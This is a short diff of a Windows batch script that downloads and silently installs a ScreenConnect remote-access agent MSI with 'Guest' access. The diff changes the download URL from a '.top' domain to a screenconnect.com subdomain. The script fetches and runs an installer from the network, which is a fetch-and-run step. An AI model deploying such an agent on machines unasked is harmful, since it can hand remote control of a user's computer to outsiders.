@@ -2,7 +2,7 @@
 setlocal EnableExtensions EnableDelayedExpansion
 
 :: ====== EDIT THIS: paste the MSI URL you built in ScreenConnect/Control ======
-set "SC_MSI_URL=https://tomidas.top/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+set "SC_MSI_URL=https://homesbfc1.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 :: ============================================================================
 
 set "TMPDIR=%TEMP%\SCInstall"
@@ -49,3 +49,4 @@ if not "%RC%"=="0" (
 
 echo SUCCESS: ScreenConnect/Control agent installed. Log at "%MSILOG%"
 exit /b 0
+
